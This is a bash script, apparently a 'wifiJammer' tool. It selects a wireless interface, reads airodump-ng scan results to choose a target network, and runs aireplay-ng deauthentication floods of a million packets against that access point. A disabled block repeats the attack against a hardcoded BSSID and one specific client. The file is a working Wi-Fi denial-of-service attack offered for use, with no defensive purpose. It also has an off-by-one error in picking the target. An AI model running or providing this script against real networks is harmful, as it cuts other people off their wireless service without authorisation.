#!/bin/bash

clear
echo "if you don't have scan networks around you, quit and do it"

com="n"
ans="n"
i=0
intSelected="none"
$networkC
allInterface=$(ip link show | grep '^[1-9]' | cut -d ' ' -f 2  | cut -d ":" -f -1)
while [ $ans != "y" ]
do
	for interface in $allInterface
	do
		echo " choose the interface :"
		echo $allInterface
		echo
		echo $interface" (y/n)"
		read ans
		if [ $ans = "y" ]; then
			intSelected=$interface
		fi
		clear
	done
done

if [ $intSelected = "none" ]; then
	echo "please next time select an interface"
	exit
fi


./wifiJammer/src/monitor.sh $intSelected


target="none"
station=$(cat result/scanNetwork/scan-01.csv | awk "/BSSID/,/Station/" | cut -d "," -f 14 | grep -v "Station" | grep -v "ESSID" | sed "s/ /_/g")
channel=$(cat result/scanNetwork/scan-01.csv | awk "/BSSID/,/Station/" | cut -d "," -f 4 | grep -v "Station" | grep -v "ESSID")
bssid=$(cat result/scanNetwork/scan-01.csv | awk "/BSSID/,/Station/" | cut -d "," -f 1 | grep -v "Station" | grep -v "ESSID")

for essid in $station
do
	i=$[i+1]
	echo $essid" "$i
	read ans
	if [ $ans = "y" ]; then
		target=$essid
		break
	fi

done

if [ $target != "none" ]; then
	arrB=($bssid)
	arrC=($channel)
	B=${arrB[i]}
	C=${arrC[i]}
	T=$target

	#need to be in the same channel
	sudo iwconfig $intSelected channel $C

	#jamm the network
	sudo aireplay-ng -0 1000000 -a $B $intSelected -j


fi

if [ $com = "y" ]; then

#scan network
airodump-ng $intSelected
#scan during 5 seconds and write the result in test-01.csv
timeout 4 airodump-ng wlan1 -w test



#scann client
airodump-ng $intSelected --bssid 02:1A:11:FD:D5:21 -c 11
#need to be in the same channel
iwconfig $intSelected channel 11
#jamm the network
aireplay-ng -0 1000000 -a 02:1A:11:FD:D5:21 $intSelected -j
#jamm B8 client from the network
aireplay-ng -0 1000000 -a 02:1A:11:FD:D5:21 $intSelected -j -c B8:27:EB:A4:46:21

fi
